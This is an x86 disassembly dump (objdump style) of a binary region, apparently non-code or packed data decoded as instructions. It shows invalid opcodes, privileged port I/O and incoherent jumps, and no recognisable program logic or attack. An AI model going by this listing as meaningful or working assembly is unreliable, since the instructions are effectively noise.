  41dc03:	retf   0x31c4
  41dc06:	sbb    al,0xd7
  41dc08:	ret    
  41dc09:	jmp    0xfc80:0x633d5fab
  41dc10:	dec    ecx
  41dc11:	jne    0x41dbc1
  41dc13:	sub    al,0x8a
  41dc15:	into   
  41dc16:	jl     0x41dbe0
  41dc18:	repnz mov ebp,0xe2ffee65
  41dc1e:	mov    dl,0xc8
  41dc20:	jle    0x41dc79
  41dc22:	xlat   BYTE PTR ds:[ebx]
  41dc23:	sub    al,BYTE PTR [esi-0x4e43bb95]
  41dc29:	das    
  41dc2a:	stos   BYTE PTR es:[edi],al
  41dc2b:	or     esp,DWORD PTR [esi+ecx*1+0x12]
  41dc2f:	sub    BYTE PTR ds:0x9dd1017b,0xf9
  41dc36:	enter  0x4db,0x5c
  41dc3a:	xor    DWORD PTR [eax*8+0x6bdeee9],0x8d
	...
  41dcb1:	add    BYTE PTR [eax],al
  41dcb3:	add    BYTE PTR [eax-0x67],ah
  41dcb6:	fsubr  st(5),st
  41dcb8:	std    
  41dcb9:	in     eax,0x79
  41dcbb:	popf   
  41dcbc:	jle    0x41dc59
  41dcbe:	es and al,0x16
  41dcc1:	imul   ebx,DWORD PTR [ebp+0x140d6fb],0x0
  41dcc8:	test   BYTE PTR [eax],0x0
  41dccb:	add    BYTE PTR [eax-0x60],cl
  41dcce:	ficom  DWORD PTR [eax+0x25]
  41dcd1:	xor    ch,ah
  41dcd3:	and    BYTE PTR [ebx+eiz*1-0x1da87c6d],bl
  41dcda:	enter  0x1152,0x6
  41dcde:	fcomp  QWORD PTR [ebp+0x3a5dbc40]
  41dce4:	test   eax,0x2ae00474
  41dce9:	xchg   ecx,eax
  41dcea:	shr    DWORD PTR [edx],1
  41dcec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dced:	and    edi,DWORD PTR [esi+0x41f378d0]
  41dcf3:	push   ds
  41dcf4:	sub    al,0xaf
  41dcf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcf7:	les    ebx,FWORD PTR ds:0x99d6439b
  41dcfd:	sbb    eax,esp
  41dcff:	retf   0x51dd
  41dd02:	arpl   WORD PTR [esi],bx
  41dd04:	(bad)
  41dd08:	iret   
  41dd09:	cld    
  41dd0a:	sub    ebx,DWORD PTR [eax-0x6091175a]
  41dd10:	imul   ebx,DWORD PTR [edi+0x7b],0x4a
  41dd14:	out    0xe3,eax
  41dd16:	push   ss
  41dd17:	gs mov esp,0xa7fcf3d2
  41dd1d:	js     0x41dd57
  41dd1f:	sar    BYTE PTR [eax],1
  41dd21:	aaa    
  41dd22:	mov    edi,0x73453984
  41dd27:	loop   0x41dd88
  41dd29:	cmp    esp,DWORD PTR [ebx+0x56]
  41dd2c:	stc    
  41dd2d:	call   0xcd97:0x1f0ab653
  41dd34:	into   
  41dd35:	out    dx,al
  41dd36:	stos   BYTE PTR es:[edi],al
  41dd37:	and    eax,0x12eb4dcd
  41dd3c:	lods   al,BYTE PTR ds:[esi]
  41dd3d:	xchg   BYTE PTR ds:[edx],al
  41dd40:	js     0x41dd63
  41dd42:	push   edx
  41dd43:	fst    QWORD PTR [edi-0x4b]
  41dd46:	push   eax
  41dd47:	or     DWORD PTR [edx-0x39],ecx
  41dd4a:	mov    ebx,0xf9113f14
  41dd4f:	leave  
  41dd50:	out    0x7a,al
  41dd52:	add    BYTE PTR [ecx],dl
  41dd54:	inc    esp
  41dd55:	inc    esp
  41dd56:	pusha  
  41dd57:	sub    al,0xcd
  41dd59:	cmp    ah,BYTE PTR [ebx]
  41dd5b:	dec    edx
  41dd5c:	and    BYTE PTR ds:0xa4cf93fb,ah
  41dd62:	movzx  esp,bl
  41dd65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd66:	jmp    0x618f:0x9d4bf618
  41dd6d:	ret    
  41dd6e:	sbb    al,0xe6
  41dd70:	inc    ecx
  41dd71:	xchg   edi,eax
  41dd72:	pop    ebx
  41dd73:	in     eax,0xb4
  41dd75:	bound  esp,QWORD PTR [edi]
  41dd77:	sub    bh,BYTE PTR [edi]
  41dd79:	test   al,0xde
  41dd7b:	cmc    
  41dd7c:	fiadd  WORD PTR [ecx+0x35bea22f]
  41dd82:	scas   eax,DWORD PTR es:[edi]
  41dd83:	mov    al,ds:0x9cb89232
  41dd88:	or     ebx,DWORD PTR [ecx]
  41dd8a:	jns    0x41ddd2
  41dd8c:	xor    ebx,DWORD PTR [eax]
  41dd8e:	mov    dl,0x24
  41dd90:	daa    
  41dd91:	xor    al,0x6b
  41dd93:	sbb    bl,BYTE PTR [esi]
  41dd95:	iret   
  41dd96:	fdiv   DWORD PTR [ecx+0x5a12c960]
  41dd9c:	loopne 0x41ddba
  41dd9e:	pop    ds
  41dd9f:	mov    ebp,ecx
  41dda1:	or     eax,0x6ad7f6f2
  41dda6:	or     al,BYTE PTR [edi+ebp*1+0x31]
  41ddaa:	nop
  41ddab:	dec    edi
  41ddac:	push   0xed0ed50a
  41ddb1:	pop    ebx
  41ddb2:	imul   edx,DWORD PTR [edx+0x6e],0x19
  41ddb6:	add    DWORD PTR [esi-0x3f106b4e],eax
  41ddbc:	xor    al,0xc
  41ddbe:	lahf   
  41ddbf:	idiv   DWORD PTR [edi+0x4d]
	...
  41de32:	add    BYTE PTR [eax],al
  41de34:	pop    es
  41de35:	jp     0x41de1f
  41de37:	jnp    0x41de36
  41de39:	sti    
  41de3a:	xchg   edi,eax
  41de3b:	jle    0x41ddf3
  41de3d:	popf   
  41de3e:	loopne 0x41ddc2
  41de40:	pop    edx
  41de41:	push   cs
  41de42:	ror    BYTE PTR [edx],1
  41de44:	int3   
  41de45:	inc    ecx
  41de46:	add    DWORD PTR [eax],eax
  41de48:	test   BYTE PTR [eax],0x0
  41de4b:	add    BYTE PTR [edi+edx*2],cl
  41de4e:	and    al,cl
  41de50:	enter  0x6b,0x13
  41de54:	xchg   edx,eax
  41de55:	push   ebx
  41de56:	popa   
  41de57:	enter  0xaff5,0x75
  41de5b:	sub    BYTE PTR [esi+0x6f],cl
  41de5e:	pop    es
  41de5f:	push   edx
  41de60:	mov    edx,DWORD PTR [edi-0x4e5c7378]
  41de66:	jle    0x41ddf4
  41de68:	sbb    DWORD PTR [ebp-0x11],esp
  41de6b:	mov    dh,0x7c
  41de6d:	arpl   WORD PTR [ebx+ebp*4+0x27],si
  41de71:	sti    
  41de72:	clc    
  41de73:	sbb    eax,0x7cae4b8
  41de78:	push   0xffffffbe
  41de7a:	into   
  41de7b:	pop    ss
  41de7c:	pop    ss
  41de7d:	dec    edx
  41de7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de7f:	sbb    ecx,DWORD PTR [edi-0x5c8cfa66]
  41de85:	dec    ebx
  41de86:	fsubr  st,st(2)
  41de88:	ins    BYTE PTR es:[edi],dx
  41de89:	xor    eax,0x7ee8f2fe
  41de8e:	inc    ebp
  41de8f:	int    0x76
  41de91:	call   0x8867796b
  41de96:	and    DWORD PTR [edx],edx
  41de98:	repnz mov BYTE PTR [esi+0x409f46f7],cl
  41de9f:	dec    esp
  41dea0:	in     al,0x66
  41dea2:	add    eax,0x9884a0c9
  41dea7:	mov    eax,0xcc1ca403
  41deac:	dec    esi
  41dead:	mov    ebx,0xc708e04a
  41deb2:	mov    ch,0xde
  41deb4:	mov    eax,ds:0x21c0669f
  41deb9:	sub    DWORD PTR [edx+ebp*2+0x10],esp
  41debd:	or     ebp,ecx
  41debf:	xor    eax,0x67f2043a
  41dec4:	or     BYTE PTR ds:0x3a98e69,ah
  41deca:	int    0xda
  41decc:	push   es
  41decd:	aam    0xbc
  41decf:	sub    ecx,ecx
  41ded1:	and    BYTE PTR [eax+ebp*1+0x40cdf9cf],0xd
  41ded9:	mov    BYTE PTR [edi],al
  41dedb:	jmp    FWORD PTR [esp+edi*8-0x2560c438]
  41dee2:	out    0xe4,eax
  41dee4:	shl    BYTE PTR [edx+eiz*2+0x2de70889],1
  41deeb:	enter  0x40d4,0xef
  41deef:	jae    0x41df5a
  41def1:	adc    eax,DWORD PTR fs:[ecx-0x2a28541]
  41def8:	ins    BYTE PTR es:[edi],dx
  41def9:	dec    ecx
  41defa:	jmp    0x641da7e7
  41deff:	vpsubb xmm2,xmm1,xmm5
  41df03:	dec    ecx
  41df04:	inc    edx
  41df05:	int3   
  41df06:	jmp    DWORD PTR [esi]
  41df08:	aam    0x93
  41df0a:	addr16 shl ch,0x69
  41df0e:	add    ebp,DWORD PTR [eax]
  41df10:	aas    
  41df11:	jge    0x41dec2
  41df13:	ss sti 
  41df15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df16:	call   ebx
  41df18:	mov    ?,WORD PTR [esi+ebx*2-0x65d6c34c]
  41df1f:	test   eax,0x3e366c97
  41df24:	mov    cl,0xa
  41df26:	ret    
  41df27:	and    cl,BYTE PTR [edi+0x71]
  41df2a:	jmp    DWORD PTR ds:0x35b5c970
  41df30:	mov    ds:0xa00f7f78,eax
  41df35:	jnp    0x41df6e
  41df37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df38:	dec    esi
  41df39:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df3b:	cmp    ebx,ebp
  41df3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df3e:	jge    0x41def8
  41df40:	imul   eax,DWORD PTR ds:[eax],0x0
	...
  41dfb4:	mov    ecx,0xad432034
  41dfb9:	push   edi
  41dfba:	sti    
  41dfbb:	(bad)  
  41dfbc:	loopne 0x41df65
  41dfbe:	cmp    ebx,DWORD PTR [esi]
  41dfc0:	jb     0x41df5f
  41dfc2:	jg     0x41df78
  41dfc4:	ret    0x142
  41dfc7:	add    dh,dh
  41dfc9:	add    BYTE PTR [eax],al
  41dfcb:	add    BYTE PTR [edx],ch
  41dfcd:	inc    edi
  41dfce:	lds    edi,FWORD PTR [edi]
  41dfd0:	les    edx,FWORD PTR [edx]
  41dfd2:	jmp    0x2595d5f2
  41dfd7:	xor    BYTE PTR [esi],0x76
  41dfda:	xchg   ebx,eax
  41dfdb:	outs   dx,DWORD PTR ds:[esi]
  41dfdc:	ffreep st(0)
  41dfde:	xchg   edi,eax
  41dfdf:	arpl   WORD PTR [edi],cx
  41dfe1:	dec    esp
  41dfe2:	sbb    al,0x52
  41dfe4:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41dfe6:	add    eax,DWORD PTR [edx+ebp*2+0x4c]
  41dfea:	das    
  41dfeb:	sub    cl,BYTE PTR [edi]
  41dfed:	and    eax,0xc93bafa0
  41dff2:	add    bl,BYTE PTR [edi-0x15]
  41dff5:	jb     0x41df77
  41dff7:	mov    esi,0x2f9ce80f
  41dffc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dffd:	cmp    DWORD PTR [ebp-0xe8cab7a],0xfcafafcc
  41e007:	cs adc eax,eax
  41e00a:	mov    DWORD PTR [ebx+ecx*2],ecx
  41e00d:	or     DWORD PTR [esi-0x31],ebx
  41e010:	out    dx,al
  41e011:	out    0x95,eax
  41e013:	push   esp
  41e014:	lds    esi,FWORD PTR [edx+0x6e35ecbf]
  41e01a:	lea    ecx,[ecx]
  41e01c:	shl    DWORD PTR [ebx],cl
  41e01e:	jo     0x41e055
  41e020:	pop    edx
  41e021:	fist   WORD PTR [ebx-0x53263886]
  41e027:	dec    ecx
  41e028:	mov    al,ch
  41e02a:	(bad)  
  41e02b:	jmp    0x41e0a7
  41e02d:	call   0x83e9:0x99ae2e55
  41e034:	adc    eax,0x637bbbf3
  41e039:	mov    ebp,eax
  41e03b:	push   ebp
  41e03c:	mov    DWORD PTR [eax+0x16],esp
  41e03f:	(bad)  
  41e040:	push   esp
  41e041:	jmp    0x41e020
  41e043:	mov    bh,BYTE PTR [esi+0x1519386a]
  41e049:	fwait
  41e04a:	(bad)  
  41e04b:	pop    edi
  41e04c:	(bad)  
  41e04d:	aas    
  41e04e:	mov    cl,ah
  41e050:	mov    eax,0x6a62abfc
  41e055:	fbstp  TBYTE PTR [edx]
  41e057:	adc    eax,0xfaec9619
  41e05c:	pop    ds
  41e05d:	repnz xor bh,BYTE PTR [ecx-0x71]
  41e061:	sti    
  41e062:	ret    0x63e6
  41e065:	hlt    
  41e066:	adc    bl,BYTE PTR [ebx+0x27a4a9a0]
  41e06c:	into   
  41e06d:	sbb    ecx,ebx
  41e06f:	adc    eax,0x84f9d34c
  41e074:	or     eax,0xc50bbb48
  41e079:	hlt    
  41e07a:	outs   dx,DWORD PTR ds:[esi]
  41e07b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e07c:	mov    ?,WORD PTR [ebx-0x15]
  41e07f:	clc    
  41e080:	add    DWORD PTR [esi-0x75fa76fe],ecx
  41e086:	jmp    0x1d02:0x5f42ba08
  41e08d:	mov    ch,0xe1
  41e08f:	imul   ebx,DWORD PTR [eax+0x35],0xa4bac07e
  41e096:	fsubr  DWORD PTR [eax-0x315c5276]
  41e09c:	loop   0x41e0f6
  41e09e:	dec    edx
  41e09f:	repnz pop es
  41e0a1:	aas    
  41e0a2:	xor    al,0xfb
  41e0a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0a5:	aam    0xb
  41e0a7:	retf   
  41e0a8:	mov    esp,0xdc7565c1
  41e0ad:	dec    ebx
  41e0ae:	fisub  WORD PTR [esp+edi*8-0x80]
  41e0b2:	inc    ebx
  41e0b3:	retf   0xad8b
  41e0b6:	cli    
  41e0b7:	adc    bh,al
  41e0b9:	aad    0xf1
  41e0bb:	xor    eax,0xc3ae2a8d
  41e0c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0c1:	or     DWORD PTR [eax],eax
	...
  41e133:	add    BYTE PTR [eax-0x3d],dl
  41e136:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41e13c:	and    al,0x13
  41e13e:	push   ss
  41e13f:	dec    edi
  41e140:	icebp  
  41e141:	xlat   BYTE PTR ds:[ebx]
  41e142:	dec    ebp
  41e143:	mov    al,0xb8
  41e145:	inc    ebx
  41e146:	add    DWORD PTR [eax],eax
  41e148:	test   BYTE PTR [eax],0x0
  41e14b:	add    BYTE PTR [ebx+eiz*8+0x4bd6dd7f],ch
  41e152:	mov    bl,0x6f
  41e154:	jnp    0x41e146
  41e156:	(bad)
  41e159:	push   edx
  41e15a:	ds mov ebx,0x6bdbe5d0
  41e160:	imul   DWORD PTR [eax+0x11]
  41e163:	ja     0x41e1ba
  41e165:	call   0x262e:0xcdb2d9b2
  41e16c:	ins    BYTE PTR es:[edi],dx
  41e16d:	mov    ebx,0x29bea57b
  41e172:	sub    al,dh
  41e174:	cs sbb eax,0x94abd54e
  41e17a:	test   ebp,0xbf08f1be
  41e180:	scas   al,BYTE PTR es:[edi]
  41e181:	sub    ebx,DWORD PTR [edi]
  41e183:	inc    esp
  41e184:	mov    ds,WORD PTR [eax-0x2dd77a31]
  41e18a:	inc    esi
  41e18b:	mov    al,ds:0x58d80c30
  41e190:	je     0x41e20a
  41e192:	sbb    eax,0x65e14c29
  41e197:	(bad)  
  41e198:	out    0xa3,eax
  41e19a:	or     dh,BYTE PTR [ebx+0x4c09d061]
  41e1a0:	ret    
  41e1a1:	sti    
  41e1a2:	and    dh,BYTE PTR [edx]
  41e1a4:	xor    al,0xe9
  41e1a6:	cwde   
  41e1a7:	mov    dh,0x78
  41e1a9:	xchg   esi,eax
  41e1aa:	pop    ebx
  41e1ab:	push   esp
  41e1ac:	je     0x41e1ce
  41e1ae:	xchg   esp,esi
  41e1b0:	jecxz  0x41e1fa
  41e1b2:	call   0x86991789
  41e1b7:	inc    ebp
  41e1b8:	addr16 shl ch,0xf9
  41e1bc:	and    DWORD PTR [eax+0x1fb33d34],edi
  41e1c2:	mov    bl,0xd9
  41e1c4:	mov    BYTE PTR [ecx-0x59227f68],bh
  41e1ca:	adc    edx,DWORD PTR [edi]
  41e1cc:	mov    ah,0x28
  41e1ce:	and    ax,0xf707
  41e1d2:	mov    ah,0x9a
  41e1d4:	sub    al,0x3b
  41e1d6:	sub    ebp,DWORD PTR [edx+0x1b7d63da]
  41e1dc:	retf   0x6272
  41e1df:	sub    BYTE PTR [edx+0x5f],0x7e
  41e1e3:	sbb    eax,0xa56b7db0
  41e1e8:	out    dx,al
  41e1e9:	fwait
  41e1ea:	repnz daa 
  41e1ec:	jecxz  0x41e212
  41e1ee:	fmul   QWORD PTR [ecx-0x67]
  41e1f1:	dec    ecx
  41e1f2:	packssdw mm2,mm2
  41e1f5:	sbb    edx,esp
  41e1f7:	clc    
  41e1f8:	test   eax,0xd557d8c0
  41e1fd:	xor    BYTE PTR [edx],dl
  41e1ff:	jo     0x41e20c
  41e201:	(bad)  
  41e202:	shl    DWORD PTR [edi+0x53],1
  41e205:	push   ebp
  41e206:	out    0x99,eax
  41e208:	push   edx
  41e209:	ins    DWORD PTR es:[edi],dx
  41e20a:	push   ss
  41e20b:	popa   
  41e20c:	add    edi,DWORD PTR [edi]
  41e20e:	mov    ah,0x42
  41e210:	adc    BYTE PTR [esi-0x41753710],bl
  41e216:	push   cs
  41e217:	pop    es
  41e218:	sub    esp,DWORD PTR [eax-0xa]
  41e21b:	mov    ebx,0xdd897f9
  41e220:	leave  
  41e221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e222:	mov    ah,BYTE PTR [ecx]
  41e224:	fild   DWORD PTR [ebp+0x2]
  41e227:	clc    
  41e228:	int    0x5f
  41e22a:	mov    ecx,0xc3d07811
  41e22f:	sbb    BYTE PTR [ecx+0x7ceaecf6],bl
  41e235:	in     al,dx
  41e236:	int    0x91
  41e238:	ficom  WORD PTR [ecx-0x2e]
  41e23b:	add    DWORD PTR [eax-0x7dfd0b0c],ebx
  41e241:	dec    edi
	...
  41e2b2:	add    BYTE PTR [eax],al
  41e2b4:	inc    BYTE PTR [eax+0x7dff54f9]
  41e2ba:	jmp    FWORD PTR [edx+0x7b6356a5]
  41e2c0:	in     eax,0xf6
  41e2c2:	cmp    cl,ch
  41e2c4:	scas   al,BYTE PTR es:[edi]
  41e2c5:	inc    esp
  41e2c6:	add    DWORD PTR [eax],eax
  41e2c8:	test   BYTE PTR [eax],0x0
  41e2cb:	add    BYTE PTR [ebx],dl
  41e2cd:	pop    esi
  41e2ce:	push   edx
  41e2cf:	in     eax,0xf9
  41e2d1:	xchg   esi,eax
  41e2d2:	sub    ecx,DWORD PTR [esi]
  41e2d4:	push   esp
  41e2d5:	jp     0x41e275
  41e2d7:	ja     0x41e340
  41e2d9:	push   ds
  41e2da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2db:	aam    0xaa
  41e2dd:	out    dx,eax
  41e2de:	inc    esp
  41e2df:	add    al,0x26
  41e2e1:	or     eax,0x975ab097
  41e2e6:	repz mov cl,0xbc
  41e2e9:	lea    edx,[ecx+eax*4+0x6af99fb4]
  41e2f0:	push   es
  41e2f1:	and    BYTE PTR [edx+0x7e3ad984],bl
  41e2f7:	sbb    ah,BYTE PTR [edi-0x12]
  41e2fa:	(bad)  
  41e2fb:	clc    
  41e2fc:	dec    esp
  41e2fd:	popf   
  41e2fe:	sti    
  41e2ff:	mov    ch,0x71
  41e301:	mov    bl,BYTE PTR [ebx]
  41e303:	add    BYTE PTR [ebx],dl
  41e305:	xchg   BYTE PTR [ebx+0x2f],bl
  41e308:	cs es mov bl,0xfe
  41e30c:	xor    ah,BYTE PTR [eax-0x7f15ce37]
  41e312:	jae    0x41e38b
  41e314:	jmp    0x41e2d9
  41e316:	add    bh,BYTE PTR cs:[esi-0x3e72bf65]
  41e31d:	movq   QWORD PTR [esi],mm1
  41e320:	aad    0x8f
  41e322:	adc    eax,0x4def83a7
  41e327:	cmpxchg DWORD PTR ds:0x69737db7,ecx
  41e32e:	mov    al,ds:0x4ae6e28c
  41e333:	cmc    
  41e334:	cmp    dh,bh
  41e336:	push   ebp
  41e337:	xor    eax,DWORD PTR [ecx]
  41e339:	out    0xea,al
  41e33b:	push   esi
  41e33c:	and    esp,DWORD PTR [ebp-0x7c983a22]
  41e342:	xor    ebx,eax
  41e344:	sub    DWORD PTR [ebp+esi*1+0x75a947c5],eax
  41e34b:	inc    ebx
  41e34c:	push   es
  41e34d:	mov    esi,0xa1d41bef
  41e352:	nop
  41e353:	and    eax,esi
  41e355:	rcr    esi,0x42
  41e358:	inc    edx
  41e359:	push   es
  41e35a:	push   ss
  41e35b:	mov    bl,0xd7
  41e35d:	push   ebp
  41e35e:	adc    eax,0xefe941ce
  41e363:	(bad)
  41e367:	hlt    
  41e368:	cmp    ebx,DWORD PTR [edx]
  41e36a:	inc    ebx
  41e36b:	jbe    0x41e323
  41e36d:	pop    edx
  41e36e:	pop    ebx
  41e36f:	xchg   DWORD PTR [ebp+0x1ee611b1],esp
  41e375:	inc    edx
  41e376:	lock add DWORD PTR [edx+0x61],0xa5fd4db5
  41e37e:	retf   
  41e37f:	retf   
  41e380:	and    esi,DWORD PTR [eax+0x35]
  41e383:	jle    0x41e3d9
  41e385:	out    0x1b,eax
  41e387:	into   
  41e388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e389:	push   esi
  41e38a:	in     eax,0x3a
  41e38c:	mov    ecx,0xd69b5264
  41e391:	mov    eax,0x46e922ae
  41e396:	in     al,0xb2
  41e398:	mov    al,0x39
  41e39a:	lahf   
  41e39b:	out    dx,eax
  41e39c:	test   BYTE PTR [edi+0x54],dh
  41e39f:	or     esi,edx
  41e3a1:	pop    ecx
  41e3a2:	xchg   ebx,eax
  41e3a3:	out    0x67,al
  41e3a5:	rcl    DWORD PTR [edx+0x7b2b5106],cl
  41e3ab:	sbb    bh,BYTE PTR [eax+0x7ac76aae]
  41e3b1:	ins    BYTE PTR es:[edi],dx
  41e3b2:	sbb    edx,DWORD PTR ds:0xe4fb690
  41e3b8:	xor    DWORD PTR [edi],ebp
  41e3ba:	sub    eax,0x80fa62dd
  41e3bf:	stos   BYTE PTR es:[edi],al
  41e3c0:	fstp   DWORD PTR [edx+0x0]
	...
  41e432:	add    BYTE PTR [eax],al
  41e434:	div    BYTE PTR [esi]
  41e436:	rcl    BYTE PTR [edx+edx*8+0x1576f6f4],cl
  41e43d:	mov    ds:0x6460fead,al
  41e442:	and    al,0x59
  41e444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e445:	inc    ebp
  41e446:	add    DWORD PTR [eax],eax
  41e448:	test   BYTE PTR [eax],0x0
  41e44b:	add    ah,ah
  41e44d:	add    DWORD PTR [ebx-0x5384186c],esi
  41e453:	jle    0x41e435
  41e455:	xor    eax,0x32f5e6a0
  41e45a:	mov    esi,0x5e52611f
  41e45f:	shr    DWORD PTR [ebx-0x152fcad1],cl
  41e465:	push   ss
  41e466:	pop    edi
  41e467:	shl    BYTE PTR [edi-0x49],0xe1
  41e46b:	jns    0x41e4d1
  41e46d:	(bad)  [eax+0x52]
  41e470:	sbb    al,0xeb
  41e472:	sub    DWORD PTR [ecx-0x21],esp
  41e475:	das    
  41e476:	inc    esp
  41e477:	(bad)  
  41e478:	ds icebp 
  41e47a:	mov    cl,BYTE PTR [ebp+0x673c2b1f]
  41e480:	cmp    esp,edi
  41e482:	add    BYTE PTR [esp+esi*1],bh
  41e485:	retf   
  41e486:	pop    ecx
  41e487:	loope  0x41e457
  41e489:	cmp    eax,0x695c3cda
  41e48e:	sub    DWORD PTR [eax],0x439ee176
  41e494:	jns    0x41e50d
  41e496:	cmp    dh,BYTE PTR ds:0xa710d33d
  41e49c:	xor    bh,BYTE PTR [esi-0x14]
  41e49f:	fnstcw WORD PTR [ebp+eax*2+0x30e97d38]
  41e4a6:	ret    0x6894
  41e4a9:	aas    
  41e4aa:	data16 (bad) 
  41e4ae:	out    0x7a,al
  41e4b0:	adc    al,0x78
  41e4b2:	fs out 0x4a,al
  41e4b5:	mov    ebp,0x6223f2
  41e4ba:	adc    ebp,esp
  41e4bc:	jb     0x41e452
  41e4be:	and    al,0xa7
  41e4c0:	pusha  
  41e4c1:	sbb    al,0x7c
  41e4c3:	(bad)  
  41e4c4:	enter  0xfd5d,0xc5
  41e4c8:	ja     0x41e4a7
  41e4ca:	into   
  41e4cb:	adc    eax,0x120bd4d0
  41e4d0:	das    
  41e4d1:	pop    esi
  41e4d2:	(bad)  
  41e4d3:	lock sub bh,0x5a
  41e4d7:	fdivr  QWORD PTR [esi]
  41e4d9:	rcl    BYTE PTR [eax+0x61],1
  41e4dc:	outs   dx,DWORD PTR ds:[esi]
  41e4dd:	xchg   ebx,eax
  41e4de:	add    esi,DWORD PTR [eax+0x22a44f34]
  41e4e4:	mov    ebp,0x8d95180
  41e4e9:	imul   eax,DWORD PTR [ebp-0x23b65798],0x8be859e6
  41e4f3:	or     eax,edi
  41e4f5:	push   ecx
  41e4f6:	jl     0x41e488
  41e4f8:	pop    esp
  41e4f9:	or     eax,0x5ffe7119
  41e4fe:	push   ds
  41e4ff:	mov    ebx,DWORD PTR [edi+0x734a2390]
  41e505:	gs dec edi
  41e507:	fs gs jge 0x41e4f3
  41e50b:	sbb    edx,edx
  41e50d:	dec    eax
  41e50e:	aam    0xac
  41e510:	test   eax,0x32e68a3
  41e515:	cmp    al,BYTE PTR [eax]
  41e517:	rcl    BYTE PTR [ecx+0x7],cl
  41e51a:	lahf   
  41e51b:	sbb    ch,BYTE PTR [edi+0x155d88a6]
  41e521:	dec    esp
  41e522:	stc    
  41e523:	pop    ds
  41e524:	dec    esi
  41e525:	outs   dx,BYTE PTR ds:[esi]
  41e526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e527:	xor    DWORD PTR [edx],ebp
  41e529:	test   ecx,esp
  41e52b:	(bad)  
  41e52c:	repz push esp
  41e52e:	cmp    eax,0x9a42d66a
  41e533:	jg     0x41e4d9
  41e535:	mov    ds:0xdbedd4,al
  41e53a:	and    BYTE PTR [ebx+ebp*8],0x5e
  41e53e:	jns    0x41e5b9
  41e540:	push   ebx
  41e541:	retf   0x0
	...
  41e5b4:	jl     0x41e54f
  41e5b6:	dec    esp
  41e5b7:	jbe    0x41e5a6
  41e5b9:	idiv   DWORD PTR [esi-0x65]
  41e5bc:	ss adc al,0xc3
  41e5bf:	repz aas 
  41e5c1:	jne    0x41e599
  41e5c3:	out    0x9a,eax
  41e5c5:	inc    esi
  41e5c6:	add    DWORD PTR [eax],eax
  41e5c8:	test   BYTE PTR [eax],0x0
  41e5cb:	add    BYTE PTR [ebx+eiz*8+0x33],al
  41e5cf:	stc    
  41e5d0:	jae    0x41e5f7
  41e5d2:	cs push cs
  41e5d4:	or     DWORD PTR ds:0xff70d921,esi
  41e5da:	mov    esi,DWORD PTR [esi+edi*1]
  41e5dd:	inc    eax
  41e5de:	inc    ecx
  41e5df:	into   
  41e5e0:	ss stc 
  41e5e2:	dec    ecx
  41e5e3:	cmc    
  41e5e4:	addr16 inc ebp
  41e5e6:	jl     0x41e582
  41e5e8:	popf   
  41e5e9:	test   eax,0x3aeb7da0
  41e5ee:	dec    DWORD PTR [ebx]
  41e5f0:	iret   
  41e5f1:	mov    esi,0xb0baf0a9
  41e5f6:	push   ecx
  41e5f7:	xchg   esp,eax
  41e5f8:	mov    ds:0x83b50845,eax
  41e5fd:	std    
  41e5fe:	or     eax,0x7e56dce4
  41e603:	and    al,0x48
  41e605:	mov    BYTE PTR [esi-0x5ba45728],bh
  41e60b:	cmp    BYTE PTR [edx-0x37],bl
  41e60e:	sbb    DWORD PTR [ebx+0x4dd8f0a6],0xdce4ff41
  41e618:	add    bh,BYTE PTR [esi+0x2b]
  41e61b:	jne    0x41e5cb
  41e61d:	pop    esi
  41e61e:	adc    eax,0x8d295121
  41e623:	jge    0x41e5a8
  41e625:	cwde   
  41e626:	pop    es
  41e627:	sbb    al,0xe
  41e629:	mov    al,0x35
  41e62b:	mov    ds:0x21ab4a99,al
  41e630:	sbb    eax,0xc46b0c24
  41e635:	int    0x91
  41e637:	aam    0x41
  41e639:	in     eax,0x91
  41e63b:	pop    edi
  41e63c:	daa    
  41e63d:	inc    edi
  41e63e:	int3   
  41e63f:	jbe    0x41e619
  41e641:	push   cs
  41e642:	cmc    
  41e643:	mov    dl,0xbb
  41e645:	ffreep st(4)
  41e647:	push   0x70
  41e649:	or     bl,BYTE PTR [ecx-0x4c]
  41e64c:	jecxz  0x41e664
  41e64e:	lods   eax,DWORD PTR ds:[esi]
  41e64f:	jl     0x41e670
  41e651:	retf   
  41e652:	aas    
  41e653:	add    cl,ch
  41e655:	int    0xed
  41e657:	adc    edi,ecx
  41e659:	xchg   esi,eax
  41e65a:	jno    0x41e6ae
  41e65c:	sbb    ch,BYTE PTR [esi]
  41e65e:	pop    edx
  41e65f:	sbb    BYTE PTR [eax+0x6b],0xaa
  41e663:	sahf   
  41e664:	mov    WORD PTR [eax+0x778d0446],cs
  41e66a:	addr16 enter 0xa55,0xda
  41e66f:	rcr    DWORD PTR [ebp-0x3],1
  41e672:	int    0xe
  41e674:	or     DWORD PTR [edx-0x47],0x7c
  41e678:	(bad)  
  41e67a:	dec    ecx
  41e67b:	or     ch,dh
  41e67d:	add    ebx,DWORD PTR [ebx-0x6a]
  41e680:	jmp    0xd217a3cf
  41e685:	ins    BYTE PTR es:[edi],dx
  41e686:	shr    BYTE PTR [ecx-0x44c1b1ac],0xc0
  41e68d:	adc    eax,0xca4f262a
  41e692:	xchg   ecx,eax
  41e693:	ds test ch,cl
  41e696:	sbb    ah,BYTE PTR [ecx-0xd8ccc58]
  41e69c:	cwde   
  41e69d:	mov    ds:0x3a20360e,eax
  41e6a2:	ja     0x41e65a
  41e6a4:	fmul   QWORD PTR [esi]
